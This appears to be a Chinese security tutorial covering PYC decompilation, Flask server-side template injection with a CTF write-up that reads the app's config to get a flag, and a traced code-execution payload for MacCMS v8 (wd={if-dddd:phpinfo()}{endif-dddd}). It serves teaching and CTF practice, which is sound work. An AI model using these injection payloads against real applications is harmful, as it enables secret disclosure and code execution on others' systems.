

![1645091804267-dd3d4c68-4d84-4777-8d8d-bc91dc28d97c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131344852-1471873563.png)

![1645091863779-ea8337ee-4249-40a2-8575-97be9156cdbe.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131343107-1166024097.png)

```plain
#知识点：
1、PYC文件反编译
2、Python-Web-SSTI
3、SSTI模版注入利用分析
```

- #### PY反编译-PYC编译文件反编译源码

```plain
判断是不是python开发：
```

![1645091950341-3a79006c-c37c-46ad-b276-a81cd955b64e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131400636-1580455871.png)

```plain
pyc文件是py文件编译后生成的字节码文件(byte code)，pyc文件经过python解释器最终会生成机器码运行。因此pyc文件是可以跨平台部署的，类似Java的.class文件，一般py文件改变后，都会重新生成pyc文件。
真题附件：http://pan.baidu.com/s/1jGpB8DS
反编译平台：
https://tool.lu/pyc/ 
http://tools.bugscaner.com/decompyle/
反编译工具：https://github.com/wibiti/uncompyle2
一般在CTF上，真实上很难遇到。类似.class文件等，PHP可以直接打包，但是.net和.class，.pyc需要解密才能得到源代码。
```

- #### SSTI入门-原理&分类&检测&分析&利用

```plain
1、什么是SSTI？有什么漏洞危害？
漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。
2、如何判断检测SSTI漏洞的存在？
-输入的数据会被浏览器利用当前脚本语言调用解析执行
3、SSTI会产生在那些语言开发应用？
-见上图
4、SSTI安全问题在生产环境那里产生？
-存在模版引用的地方，如404错误页面展示
-存在数据接收引用的地方，如模版解析获取参数数据

报错的时候存在数据接受，把变量输入进去，解析模板的时候出现问题。

web应用是有很多模板，它是一个显示样式的东西。
切换样式后，数据一样都存在的。
样式代码：
 <div class="center-content error">
 <h1>Oops! That page doesn't exist.</h1>
 <h3>%s</h3>
 </div> 
%s是一个可控的值，留给数据库去操作，取出数据去显示，不能写死。可以写上payload，让代码进行执行。
运行程序，访问本地5000端口。
```





![1645092021555-37c5adbc-db9b-4802-8e4f-ef7e19c3a318.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131634026-356924496.png)

```plain
如果访问出错地址，
```

![1645092047174-a7cc351e-4725-4dc7-8cab-5d7fd5d42509.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131538186-1817852395.png)

```plain
源代码接受：
```

![1645092075561-e2f9bc7e-920b-4b6f-b0f8-c8fae300a9d5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131543562-1531643522.png)

```plain
构造报错：http://192.168.0.113:5000/njkncd?404_url=1
```

![1645092097027-73c470c1-1461-4534-8e26-fe8cf8604ccb.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131657820-1927560441.png)

```plain
访问http://192.168.0.113:5000/njkncd?404_url={{2-2}} ：2-2被代入python执行。
```

![1645092151451-b90293a7-8429-4782-84ef-e2741033fb8a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131655115-835438083.png)

- #### SSTI考点-CTF靶场-[WesternCTF]shrine

```plain
1、源码分析SSTI考点
2、测试判断SSTI存在
3、分析代码过滤和FLAG存储
4、利用Flask两个函数利用获取
https://blog.csdn.net/houyanhua1/article/details/85470175
url_for()函数是用于构建操作指定函数的URL
get_flashed_messages()函数是获取传递过来的数据
/shrine/{{url_for.__globals__}}
/shrine/{{url_for.__globals__['current_app'].config}}
/shrine/{{get_flashed_messages.__globals__}}
/shrine/{{get_flashed_messages.__globals__['current_app'].config}}
```

![1645092199955-ac197001-e35f-4a27-a895-0ba37d719f3f.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131713866-1700480121.png)

```plain
发现关键性过滤
 s = s.replace('(', '').replace(')', '')
模板执行函数
render_template_string

判断存在：执行：http://b2014503-8276-429e-8d09-b1b38af83d43.node4.buuoj.cn:81/shrine/%7B%7B2-2%7D%7D
```

![1645092232099-fca9501d-cd5d-4b38-a48a-3acd6b963add.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131714011-842379536.png)

```plain
• 获取当前脚本所有的全局变量：http://b2014503-8276-429e-8d09-b1b38af83d43.node4.buuoj.cn:81/shrine/%7B%7Burl_for.__globals__%7D%7D
```

![1645092260044-c69a9eb5-e884-4756-aed4-6af4c5463345.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131715136-1145043485.png)

```plain
发现当前正在使用的APP：
<class 'flask.helpers._PackageBoundObject'>, 'current_app': <Flask 'app'>
```

![1645092283644-d430e245-007a-4c84-86b1-01b99c14df8b.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131715239-1959675163.png)

```plain
http://b2014503-8276-429e-8d09-b1b38af83d43.node4.buuoj.cn:81/shrine/%7B%7Burl_for.__globals__['current_app'].config['FLAG']%7D%7D  得到flag
```

- #### SSTI考点-CMS源码-MACCMS_V8.X执行

```plain
Payload:index.php?m=vod-search&wd={if-dddd:phpinfo()}{endif-dddd}
1、根据wd传递的代码找指向文件
2、index->vod->tpl->ifex->eval
3、构造Payload带入ifex并绕过后执行

m=vod-search
wd={if-dddd:phpinfo()}{endif-dddd} 

知道payload，推出漏洞成因
m传参：
```

![1645092349876-6b5ef3c4-e42f-4797-b752-81f4954760e8.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131714317-648667545.png)

```plain
定位到be函数：
```

![1645092372153-ce0d8404-42c9-4b49-a498-2b7c559880d6.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131715224-2098816609.png)

```plain
发现包含文件：
```

![1645092399091-18c86bde-3220-44e5-8916-9dcd4b3d8dfb.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131714417-280163961.png)

```plain
输出$ac，发现是vod文件，然后找到vod.php文件
在vod.php发现wd传参：
```

![1645092426281-2752f567-94db-4aec-92f8-679def9c021e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131714769-933300109.png)



```plain
跟踪tpl，指向ifex函数
跟踪ifex函数：
```

![1645092460751-bd037c66-f7ed-409a-b643-513eedca0fac.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912131714630-1614117682.png)

```plain
发现命令执行代码段
```